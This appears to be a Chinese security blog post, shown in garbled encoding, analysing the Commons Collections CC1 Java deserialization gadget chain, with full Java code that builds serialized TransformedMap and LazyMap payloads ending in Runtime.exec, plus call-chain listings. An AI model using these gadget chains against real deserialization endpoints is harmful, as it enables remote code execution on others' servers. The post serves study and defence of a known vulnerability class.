CCåº“æä¾›äº†ä¸€ä¸ªæŠ½è±¡ç±»org.apache.commons.collections.map.AbstractMapDecorator,è¿™ä¸ªç±»æ˜¯Mapçš„æ‰©å±•ç±»ï¼Œå¹¶ä¸”ä»Decoratorå¯ä»¥çœ‹å‡ºï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºç¡€çš„è£…é¥°å™¨ï¼Œç”¨æ¥ç»™mapæä¾›é™„åŠ åŠŸèƒ½ï¼Œè¢«è£…é¥°çš„mapå­˜åœ¨è¯¥ç±»çš„å±æ€§ä¸­ï¼Œå¹¶ä¸”å°†æ‰€æœ‰çš„æ“ä½œéƒ½è½¬å‘ç»™è¿™ä¸ªmapã€‚\nè¿™é‡Œæˆ‘ä»¬ä¸»è¦å­¦ä¹ ä¸€ä¸‹å®ƒçš„ä¸¤ä¸ªå®ç°ç±»ï¼ŒTransformedMapå’ŒLazyMapã€‚\nTransformedMap org.apache.commons.collections.map.TransformedMap#decorateæ–¹æ³•æè¿° äº†ä¸€ä¸ªå…ƒç´ åœ¨è¢«åŠ å…¥åˆ°é›†åˆå†…æ—¶ï¼Œè‡ªåŠ¨å¯¹è¯¥å…ƒç´ è¿›è¡Œç‰¹å®šçš„ä¿®é¥°å˜æ¢ï¼Œå…·ä½“çš„å˜æ¢é€»è¾‘ç”±ä¼ å…¥çš„keyTransformerå’ŒvalueTransformerè¿›è¡Œå®šä¹‰ï¼Œè¿™ä¸¤ä¸ªå‚æ•°åœ¨TransformedMapå®ä¾‹åŒ–çš„æ—¶å€™ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚\næµ‹è¯•ç”¨ä¾‹å¦‚ä¸‹:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 import com.sun.org.apache.xalan.internal.xsltc.cmdline.Transform; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; /** * @ClassName TransformedMapTest * @Description TODO * @Author reus09 * @Date 2022/10/24 21:00 * @Version 1.0 **/ public class TransformedMapTest { public static HashMap\u0026lt;Integer, String\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); /* * åˆ›å»ºè‡ªå®šä¹‰key , å®ç°key + 1 */ public static Transformer keyTransformer = input -\u0026gt;{ int num = (int) input; num += 1 ; return (Object)num; }; // åˆ›å»ºè‡ªå®šä¹‰`value` ï¼Œ å®ç°`value`å­—ç¬¦ä¸²åé¢æ‹¼æ¥\u0026#34;1\u0026#34; public static Transformer valueTransformer = output -\u0026gt;{ String string = output.toString(); return string + \u0026#34;1\u0026#34;; }; public static void main(String[] args) { hashMap.put(1,\u0026#34;a\u0026#34;); System.out.println(\u0026#34;åˆå§‹åŒ–mapï¼š\u0026#34; + hashMap); Map map = TransformedMap.decorate(hashMap,keyTransformer,valueTransformer); map.put(2,\u0026#34;b\u0026#34;); System.out.println(\u0026#34;transformedMap: \u0026#34; + hashMap); map.put(1,\u0026#34;w\u0026#34;); System.out.println(\u0026#34;transformedMap: \u0026#34; + hashMap); map.remove(1); System.out.println(\u0026#34;transformedMap: \u0026#34; + hashMap); } } è¿è¡Œæ•ˆæœå›¾:\nä¹Ÿå°±æ˜¯è¯´èµ·åˆ°çš„æ•ˆæœæ˜¯:å½“ TransformedMap å†…çš„ key æˆ–è€… value å‘ç”Ÿå˜åŒ–æ—¶ï¼ˆä¾‹å¦‚è°ƒç”¨ TransformedMap çš„ put æ–¹æ³•æ—¶ï¼‰ï¼Œå°±ä¼šè§¦å‘ç›¸åº”å‚æ•°çš„ Transformer çš„ transform() æ–¹æ³•ã€‚\nLazyMap org.apache.commons.collections.map.LazyMap ä¸ TransformedMap ç±»ä¼¼ï¼Œä¸è¿‡å·®å¼‚æ˜¯è°ƒç”¨ get() æ–¹æ³•æ—¶å¦‚æœä¼ å…¥çš„ key ä¸å­˜åœ¨ï¼Œåˆ™ä¼šè§¦å‘ç›¸åº”å‚æ•°çš„ Transformer çš„ transform() æ–¹æ³•ã€‚\nLazyMapåœ¨åˆå§‹åŒ–çš„æ—¶å€™ï¼Œéœ€è¦å¦å¤–ä¼ å…¥ä¸€ä¸ªFactoryæˆ–è€…Transformeræ¥å®šä¹‰æ“ä½œã€‚\næŸ¥çœ‹LazyMapçš„getæ–¹æ³•ï¼Œåœ¨å¤„ç†è¿‡ç¨‹ä¸­ï¼Œå°†keyç»è¿‡fatcory.transform()æ–¹æ³•å¤„ç†åçš„ç»“æœä½œä¸ºvalueã€‚\nç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; /** * @ClassName LazyMapTest * @Description TODO * @Author reus09 * @Date 2022/10/25 15:27 * @Version 1.0 **/ public class LazyMapTest { public static HashMap\u0026lt;Integer, String\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); // key å¯¹åº”çš„ value èµ‹å€¼ä¸º key+1 public static Transformer factory = input -\u0026gt;{ int num = (int) input; num += 1 ; return (Object)num; }; public static void main(String[] args) { hashMap.put(1,\u0026#34;hello\u0026#34;); System.out.println(hashMap); Map lazyMap = LazyMap.decorate(hashMap,factory); lazyMap.get(2); System.out.println(hashMap); lazyMap.get(5); System.out.println(hashMap); } } è¿è¡Œç»“æœï¼š\nä¸ LazyMap å…·æœ‰ç›¸åŒåŠŸèƒ½çš„ï¼Œæ˜¯ org.apache.commons.collections.map.DefaultedMapï¼ŒåŒæ ·æ˜¯ get() æ–¹æ³•ä¼šè§¦å‘ transform æ–¹æ³•ã€‚\nTransformer åœ¨ä¸Šé¢çš„AbstractMapDecoratorçš„ç›¸å…³å­ç±»çš„å®ä¾‹åŒ–è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°éƒ½éœ€è¦ä¼ å…¥Transformerè¿›è¡Œå¤„ç†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¿›ä¸€æ­¥çœ‹ä¸€ä¸‹Transformerã€‚\norg.apache.commons.collections.Transformer æ˜¯ä¸€ä¸ªæ¥å£ï¼Œæä¾›äº†ä¸€ä¸ª transform() æ–¹æ³•ï¼Œç”¨æ¥å®šä¹‰å…·ä½“çš„è½¬æ¢é€»è¾‘ã€‚æ–¹æ³•æ¥æ”¶ Object ç±»å‹çš„ inputï¼Œå¤„ç†åå°† Object è¿”å›ã€‚\nåœ¨ Commons Collection 3.1 ä¸­ï¼Œç¨‹åºæä¾›äº† 14 ä¸ª Transformer çš„å®ç°ç±»ï¼Œç”¨æ¥å®ç°ä¸åŒçš„å¯¹ TransformedMap ä¸­ key/value è¿›è¡Œä¿®æ”¹çš„åŠŸèƒ½ã€‚\næˆ‘ä»¬é‡ç‚¹å…³æ³¨å‡ ä¸ªå®ç°ç±»ã€‚\nInvokeTransformer è¿™ä¸ªå®ç°ç±»ä» Commons Collections 3.0 å¼•å…¥ï¼ŒåŠŸèƒ½æ˜¯ä½¿ç”¨åå°„åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å®ƒçš„ transfrom æ–¹æ³•ï¼Œæ–¹æ³•æ³¨é‡Šå†™çš„å¾ˆæ¸…æ¥šï¼Œé€šè¿‡è°ƒç”¨ input çš„æ–¹æ³•ï¼Œå¹¶å°†æ–¹æ³•è¿”å›ç»“æœä½œä¸ºå¤„ç†ç»“æœè¿›è¡Œè¿”å›ã€‚\nè°ƒç”¨çš„å‚æ•°iMethodName/iParamTypesæ˜¯åœ¨ InvokerTransformer çš„æ„é€ å‡½æ•°ä¸­ä¼ å…¥ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ InvokerTransformer æ¥æ‰§è¡Œæ–¹æ³•\næµ‹è¯•ä»£ç :\n1 2 3 // InvokerTransformer å¼¹è®¡ç®—å™¨æµ‹è¯• Transformer transformer = new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a Calculator.app\u0026#34;}); transformer.transform(Runtime.getRuntime()); è¿™ä¸ªä»£ç çš„é€»è¾‘å°±æ˜¯å°†ä¼ å…¥çš„Runtime.getRuntime()åå°„è°ƒç”¨å®ƒå†…éƒ¨çš„æ–¹æ³•exec,å…¶ä¸­execæ–¹æ³•æ˜¯æ ¹æ®ä¼ å…¥çš„methodName,iParamTypeç¡®å®šçš„ï¼Œå¹¶ä¸”execæ‰§è¡Œçš„iArgsä¹Ÿæ˜¯åˆå§‹åŒ–è¿‡ç¨‹ä¸­ç»™äºˆçš„ã€‚\nChainedTransformer org.apache.commons.collections.functors.ChainedTransformer ç±»ä¹Ÿæ˜¯ä¸€ä¸ª Transformerçš„å®ç°ç±»ï¼Œä½†æ˜¯è¿™ä¸ªç±»è‡ªå·±ç»´æŠ¤äº†ä¸€ä¸ª Transformer æ•°ç»„ï¼Œ åœ¨è°ƒç”¨ ChainedTransformer çš„ transform æ–¹æ³•æ—¶ï¼Œä¼šå¾ªç¯æ•°ç»„ï¼Œä¾æ¬¡è°ƒç”¨ Transformer æ•°ç»„ä¸­æ¯ä¸ª Transformer çš„ transform æ–¹æ³•ï¼Œå¹¶å°†ç»“æœä¼ é€’ç»™ä¸‹ä¸€ä¸ª Transformer\nè¿™æ®µä»£ç é€»è¾‘é€šä¿—æ¥è¯´ï¼Œå‰â¼€ä¸ªå›è°ƒè¿”å›çš„ç»“æœï¼Œä½œä¸ºåâ¼€ä¸ªå›è°ƒçš„å‚æ•°ä¼ â¼Š\nè¿™æ ·å°±ç»™äº†ä½¿ç”¨è€…é“¾å¼è°ƒç”¨å¤šä¸ª Transformeråˆ†åˆ«å¤„ç†å¯¹è±¡çš„èƒ½åŠ›ã€‚\nConstantTransformer org.apache.commons.collections.functors.ConstantTransformer æ˜¯ä¸€ä¸ªè¿”å›å›ºå®šå¸¸é‡çš„ Transformerï¼Œåœ¨åˆå§‹åŒ–æ—¶å‚¨å­˜äº†ä¸€ä¸ª Objectï¼Œåç»­çš„è°ƒç”¨æ—¶ä¼šç›´æ¥è¿”å›è¿™ä¸ª Objectã€‚\nè¿™ä¸ªç±»ç”¨äºå’Œ ChainedTransformer é…åˆï¼Œå°†å…¶ç»“æœä¼ å…¥ InvokerTransformer æ¥è°ƒç”¨æˆ‘ä»¬æŒ‡å®šçš„ç±»çš„æŒ‡å®šæ–¹æ³•ã€‚\næµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š\næ”»å‡»æ„é€  æœ‰äº†ä¸Šè¿°åŸºç¡€çŸ¥è¯†çš„é“ºå«ï¼Œå°±å¯ä»¥å¼€å§‹æ„é€ ååºåˆ—åŒ–çš„æ¶æ„åˆ©ç”¨ä»£ç äº†ã€‚\nç”±äºç¯å¢ƒé—®é¢˜çš„è€ƒè™‘\nä¾‹å¦‚æˆ‘ä»¬è¿˜æ˜¯è¦æ‰§è¡Œ Runtime.getRuntime().exec(\u0026quot;open -a Calculator.app\u0026quot;)ï¼ŒæŒ‰ç…§éœ€æ±‚å¯¹å…¶è¿›è¡Œæ‹†åˆ†ï¼Œè¿™é‡Œä½¿ç”¨ TransformedMap è§¦å‘ã€‚\nå®ä¾‹ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 // ç»“åˆ ChainedTransformer ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a Calculator.app\u0026#34;}) }); Map map2 = TransformedMap.decorate(hashMap, chain, null); map2.put(10, \u0026#34;aaa\u0026#34;); ä½¿ç”¨ ConstantTransformer è¿”å› Runtime çš„ Class å¯¹è±¡ï¼Œä¼ å…¥ InvokerTransformer ä¸­ï¼Œå¹¶å€ŸåŠ© ChainedTransformer çš„é“¾å¼è°ƒç”¨æ–¹å¼å®Œæˆåå°„çš„è°ƒç”¨ï¼Œæ”¯æŒæ¶æ„ä»£ç ã€‚\né‚£ä¹ˆæˆ‘ä»¬ä¸ºä»€ä¹ˆä¸ç›´æ¥æ„é€ new ConstantTransformer(Runtime.getRuntime()),ç„¶åç›´æ¥execå‘¢ï¼Ÿ åŸå› æ˜¯ï¼ŒJavaä¸­ä¸æ˜¯æ‰€æœ‰å¯¹è±¡éƒ½æ”¯æŒåºåˆ—åŒ–ï¼Œå¾…åºåˆ—åŒ–çš„å¯¹è±¡å’Œæ‰€æœ‰å®ƒä½¿ç”¨çš„å†…éƒ¨å±æ€§å¯¹è±¡ï¼Œå¿…é¡»éƒ½å®ç°äº† java.io.Serializable æ¥å£ã€‚è€Œæˆ‘ä»¬æœ€æ—©ä¼ ç»™ConstantTransformerçš„æ˜¯ Runtime.getRuntime() ï¼ŒRuntimeç±»æ˜¯æ²¡æœ‰å®ç° java.io.Serializable æ¥å£çš„ï¼Œæ‰€ä»¥ä¸å…è®¸è¢«åºåˆ—åŒ–ã€‚\nåœ¨ä¸Šè¿°æ¡ˆä¾‹ä¸­ï¼Œä½¿ç”¨ TransformedMap çš„ decorate æ–¹æ³•å°† ChainedTransformer è®¾ç½®ä¸º map çš„è£…é¥°å™¨å¤„ç†æ–¹æ³•åï¼Œå½“è°ƒç”¨ TransformedMap çš„ put/setValue ç­‰æ–¹æ³•æ—¶ä¼šè§¦å‘ Transformer é“¾çš„è°ƒç”¨å¤„ç†ã€‚\nä¸Šé¢ä¸€è¿ä¸²çš„ChainTransformerè½¬æ¢æˆJavaæ‰§è¡Œé€»è¾‘ï¼Œå¦‚ä¸‹æ‰€ç¤º\n1 2 Runtime Runtime = (java.lang.Runtime) Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(null); Runtime.exec(\u0026#34;open -a Calculator.app\u0026#34;); æˆªæ­¢åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬é€šè¿‡CCåº“æˆåŠŸæ„é€ äº†sink gadget : InvokeTransformerå’Œchain gadget:ChainedTransformer å’Œ ConstantTransformerã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªkick-off gadgetï¼šä¸€ä¸ªç±»é‡å†™äº†readObjectï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ”¹å˜äº†mapçš„å€¼ã€‚\näºæ˜¯æœ‰äº†sun.reflect.annotation.AnnotationInvocationHandler è¿™ä¸ªç±»ã€‚è¿™ä¸ªç±»å®ç°äº† InvocationHandler æ¥å£ï¼ŒåŸæœ¬æ˜¯ç”¨äº JDK å¯¹äºæ³¨è§£å½¢å¼çš„åŠ¨æ€ä»£ç†ã€‚\næˆ‘ä»¬å°±æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªç±»å…·ä½“å¯è¢«åˆ©ç”¨çš„ç‚¹ã€‚\né¦–å…ˆçœ‹ä¸€ä¸‹æ„é€ æ–¹æ³•:\næ„é€ æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Annotationå®ç°ç±»çš„Classå¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªkeyä¸ºstring,valueä¸ºObjectçš„Mapã€‚æ„é€ æ–¹æ³•ä¸­åˆ¤æ–­typeæœ‰ä¸”åªæœ‰ä¸€ä¸ªçˆ¶æ¥å£ï¼Œå¹¶ä¸”æ˜¯java.lang.annotation.Annotaion.class,æ‰ä¼šåˆå§‹åŒ–ä¸¤ä¸ªå‚æ•°ã€‚\nè¿™é‡Œä¼ å…¥çš„memerValueså°±æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨æ¥è§¦å‘çš„Mapï¼Œç„¶åï¼Œæˆ‘ä»¬å°±çœ‹ä¸€ä¸‹è¿™ä¸ªç±»é‡å†™çš„readObjectæ–¹æ³•ã€‚\nå› ä¸ºwindowsä¸‹é¢é…ç½®javaå¤šç‰ˆæœ¬è¾ƒä¸ºæ–¹ä¾¿ï¼Œå°±ç›´æ¥ä½¿ç”¨windowsä¸‹çš„ç‰ˆæœ¬\né¦–å…ˆè°ƒç”¨ AnnotationType.getInstance(this.type) æ–¹æ³•æ¥è·å– type è¿™ä¸ªæ³¨è§£ç±»å¯¹åº”çš„ AnnotationType çš„å¯¹è±¡ï¼Œç„¶åè·å–å…¶memberTypeså±æ€§ï¼Œè¿™ä¸ªå±æ€§æ˜¯ä¸ª Mapï¼Œå­˜æ”¾è¿™ä¸ªæ³¨è§£ä¸­å¯ä»¥é…ç½®çš„å€¼ã€‚\nç„¶åå¾ªç¯ this.memberValues è¿™ä¸ª Map ï¼Œè·å–å…¶ Keyï¼Œå¦‚æœæ³¨è§£ç±»çš„ memberTypes å±æ€§ä¸­å­˜åœ¨ä¸ this.memberValues çš„ key ç›¸åŒçš„å±æ€§ï¼Œå¹¶ä¸”å–å¾—çš„å€¼ä¸æ˜¯ ExceptionProxy çš„å®ä¾‹ä¹Ÿä¸æ˜¯ memberValues ä¸­å€¼çš„å®ä¾‹ï¼Œåˆ™å–å¾—å…¶å€¼ï¼Œå¹¶è°ƒç”¨setValueæ–¹æ³•å†™å…¥å€¼ã€‚\nå…¶å®å°±æ˜¯ï¼Œæ³¨è§£æœ¬è´¨æ˜¯ä¸€ä¸ªç»§æ‰¿äº†Annotationçš„ç‰¹æ®Šæ¥å£ï¼Œå…·ä½“å®ç°æ˜¯Javaè¿è¡Œäº§ç”Ÿçš„åŠ¨æ€ä»£ç†ç±»ï¼Œé€šè¿‡ä»£ç†å¯¹è±¡è°ƒç”¨è‡ªå®šä¹‰æ³¨è§£(æ¥å£)çš„æ–¹æ³•ï¼Œæœ€ç»ˆä¼šè°ƒç”¨AnnotationInvocationHandlerçš„invokeæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šä»memerValuesè¿™ä¸ªMapä¸­ç´¢å¼•å‡ºå¯¹åº”çš„å€¼ã€‚\né‡å†™readObjectæ–¹æ³•ï¼Œå°±ç»™äº†ç¨‹åºä¼ é€’æ³¨è§£å€¼çš„èƒ½åŠ›ã€‚\nTransformedMapæ„é€  æ„é€ payloadçš„æ€è·¯ï¼š\næ„é€ ä¸€ä¸ªAnnotationInvocationHandlerå®ä¾‹ï¼Œåˆå§‹åŒ–æ—¶ä¼ å…¥ä¸€ä¸ªæ³¨è§£ç±»å’Œä¸€ä¸ª Mapï¼Œè¿™ä¸ª Map çš„ key ä¸­è¦æœ‰æ³¨è§£ç±»ä¸­å­˜åœ¨çš„å±æ€§ï¼Œä½†æ˜¯å€¼ä¸æ˜¯å¯¹åº”çš„å®ä¾‹ï¼Œä¹Ÿä¸æ˜¯ ExceptionProxy å¯¹è±¡ã€‚ è¿™ä¸ª Map ç”± TransformedMap å°è£…ï¼Œå¹¶è°ƒç”¨è‡ªå®šä¹‰çš„ ChainedTransformer è¿›è¡Œè£…é¥°ã€‚ ChainedTransformer ä¸­å†™å…¥å¤šä¸ª Transformer å®ç°ç±»ï¼Œç”¨äºé“¾å¼è°ƒç”¨ï¼Œå®Œæˆæ¶æ„æ“ä½œã€‚ æœ€ç»ˆçš„æ¶æ„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class CC1WithTransFormedMap { public static String fileName = \u0026#34;CC1withTransformedMap.bin\u0026#34;; public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException { Map hashMap = new HashMap(); // è¿™é‡Œ key ä¸€å®šæ˜¯ ä¸‹é¢å®ä¾‹åŒ– AnnotationInvocationHandler æ—¶ä¼ å…¥çš„æ³¨è§£ç±»ä¸­å­˜åœ¨çš„å±æ€§å€¼ // å¹¶ä¸”è¿™é‡Œçš„å€¼çš„ä¸€å®šä¸æ˜¯å±æ€§å€¼çš„ç±»å‹ hashMap.put(\u0026#34;comments\u0026#34;, 2); // ç»“åˆ ChainedTransformer ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }); Map transformedMap = TransformedMap.decorate(hashMap, null, chain); Class\u0026lt;?\u0026gt; c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor = c.getDeclaredConstructors()[0]; constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Generated.class, transformedMap); SerializeUtil.writeObjectToFile(handler, fileName); SeralizeUtil.readFileObject(fileName); } } æˆ‘ä»¬æŸ¥çœ‹Generated.class,å‘ç°å…¶å­˜åœ¨ä¸€ä¸ªcommentså±æ€§ã€‚\nåœ¨ç½‘ä¸Šå¤§å¤šæ•°payloadéƒ½ä½¿ç”¨Target.classçš„valueæ¥è§¦å‘,å…¶å®ç”¨ä»€ä¹ˆè§¦å‘éƒ½å¯ä»¥ï¼Œåªè¦æ˜¯ä¸€ä¸ªæœ‰å±æ€§çš„æ³¨è§£å³å¯ã€‚\nä¸Šè¿°æ¶æ„payloadæ‰§è¡Œæ•ˆæœï¼š\nLazyMapæ„é€  ä¹‹å‰æåˆ°è¿‡ï¼ŒLazyMap é€šè¿‡ get() æ–¹æ³•è·å–ä¸åˆ° key çš„æ—¶å€™è§¦å‘ Transformerã€‚\næˆ‘ä»¬å‘ç° AnnotationInvocationHandler çš„invoke()æ–¹æ³•å¯ä»¥è§¦å‘ memberValues çš„ get æ–¹æ³•ã€‚\nè¿™é‡Œç”¨åˆ°çš„åŠ¨æ€ä»£ç†ï¼Œç»“åˆæˆ‘ä»¬ä¹‹å‰å­¦åˆ°çš„ï¼Œè¢«åŠ¨æ€ä»£ç†çš„å¯¹è±¡è°ƒç”¨ä»»æ„æ–¹æ³•éƒ½ä¼šè°ƒç”¨å¯¹åº”InvocationHandlerçš„invokeæ–¹æ³•ã€‚\né‚£ä¹ˆæ„é€ æ€è·¯ä¸ºï¼šåœ¨ä½¿ç”¨å¸¦æœ‰è£…é¥°å™¨çš„LazyMapåˆå§‹åŒ–AnnotationInvocationHandler ä¹‹å‰ï¼Œå…ˆä½¿ç”¨InvocationHandlerä»£ç†ä¸€ä¸‹LazyMap,è¿™æ ·ååºåˆ—åŒ–AnnotationInvocationHandler æ—¶ï¼Œè°ƒç”¨ LazyMap å€¼çš„ setValue æ–¹æ³•ä¹‹å‰ä¼šè°ƒç”¨ä»£ç†ç±»çš„invokeæ–¹æ³•ï¼Œè§¦å‘LazyMap çš„ get æ–¹æ³•ã€‚\nä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 public class CC1WithLazyMap { public static String fileName = \u0026#34;CC1withLazyMap.bin\u0026#34;; public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException { // ç»“åˆ ChainedTransformer ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }); Map lazyMap = LazyMap.decorate(new HashMap(), chain); Class\u0026lt;?\u0026gt; c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor = c.getDeclaredConstructors()[0]; constructor.setAccessible(true); // åˆ›å»ºæºå¸¦ç€ LazyMap çš„ AnnotationInvocationHandler å®ä¾‹ InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); // åˆ›å»ºLazyMapçš„åŠ¨æ€ä»£ç†ç±»å®ä¾‹ Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler); // ä½¿ç”¨åŠ¨æ€ä»£ç†åˆå§‹åŒ– AnnotationInvocationHandler InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy); SerializeUtil.writeObjectToFile(invocationHandler, fileName); SerializeUtil.readFileObject(fileName); } } è¿™ä¸ªåœ°æ–¹å¯ä»¥è¿™æ ·ç†è§£ï¼Œæœ€å¤–é¢çš„ä¸€å±‚invocationHandlerå…¶å®å°±ä½œä¸ºä¸€ä¸ªkick-offï¼Œååºåˆ—åŒ–æ‰§è¡ŒreadObjectæ–¹æ³•ï¼Œç„¶ååœ¨readObjectæ–¹æ³•ä¸­å¯¹æˆ‘ä»¬ä¼ å…¥çš„mapProxyè¿›è¡Œæ“ä½œã€‚å› ä¸ºæˆ‘ä»¬çš„mapProxyæ˜¯æˆ‘ä»¬LazyMapè£…é¥°è¿‡çš„åŠ¨æ€ä»£ç†çš„ä¸€ä¸ªå®ä¾‹ï¼Œå› æ­¤mapProxyçš„ä»»ä½•æ“ä½œéƒ½ä¼šä½¿ç”¨handleré‡Œé¢çš„invokeæ–¹æ³•ï¼Œåœ¨invokeæ–¹æ³•è§¦å‘äº†this.memberValues.get(var4),ç„¶åè§¦å‘LazyMapçš„getæ“ä½œï¼Œä»è€Œè§¦å‘æ”»å‡»é“¾ã€‚\næ€»ç»“ ä»¥ä¸Šå°±æ˜¯ CC1 é“¾åˆ†æçš„å…¨éƒ¨å†…å®¹äº†ï¼Œæœ€åæ€»ç»“ä¸€ä¸‹ã€‚\nåˆ©ç”¨è¯´æ˜ï¼š\nåˆ©ç”¨ AnnotationInvocationHandler åœ¨ååºåˆ—åŒ–æ—¶ä¼šè§¦å‘ Map çš„ get/set ç­‰æ“ä½œï¼Œé…åˆ TransformedMap/LazyMap åœ¨æ‰§è¡Œ Map å¯¹è±¡çš„æ“ä½œæ—¶ä¼šæ ¹æ®ä¸åŒæƒ…å†µè°ƒç”¨ Transformer çš„è½¬æ¢æ–¹æ³•ï¼Œæœ€åç»“åˆäº† ChainedTransformer çš„é“¾å¼è°ƒç”¨ã€InvokerTransformer çš„åå°„æ‰§è¡Œå®Œæˆäº†æ¶æ„è°ƒç”¨é“¾çš„æ„æˆã€‚å…¶ä¸­ LazyMap çš„è§¦å‘è¿˜ç”¨åˆ°äº†åŠ¨æ€ä»£ç†æœºåˆ¶ã€‚ Gadget æ€»ç»“ï¼š\nkick-off gadgetï¼šsun.reflect.annotation.AnnotationInvocationHandler#readObject() sink gadgetï¼šorg.apache.commons.collections.functors.InvokerTransformer#transform() chain gadgetï¼šorg.apache.commons.collections.functors.ChainedTransformer#transform() è°ƒç”¨é“¾å±•ç¤ºï¼š\nTransformedMapè°ƒç”¨é“¾\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() MapEntry.setValue() TransformedMap.checkSetValue() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() LazyMapè°ƒç”¨é“¾\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() ä¾èµ–ç‰ˆæœ¬\ncommons-collections : 3.1 TransformedMap - jdk \u0026lt; 8u71\nåŒæ—¶ï¼Œè¿™é‡Œä¹ŸæåŠä¸€ä¸‹ä¸ºä»€ä¹ˆcc1é“¾çš„TransformedMapçš„jdkç‰ˆæœ¬è¦æ±‚å°äº8u71,åœ¨8u71ä»¥åå¤§æ¦‚æ˜¯2015å¹´12æœˆçš„æ—¶å€™ï¼ŒJava å®˜æ–¹ä¿®æ”¹äº† sun.reflect.annotation.AnnotationInvocationHandler çš„readObjectå‡½æ•°ï¼š\næ”¹åŠ¨åï¼Œä¸å†ç›´æ¥ä½¿ç”¨ååºåˆ—åŒ–å¾—åˆ°çš„Mapå¯¹è±¡ï¼Œè€Œæ˜¯æ–°å»ºäº†ä¸€ä¸ªLinkedHashMapå¯¹è±¡ï¼Œå¹¶å°†åŸæ¥çš„é”®å€¼æ·»åŠ 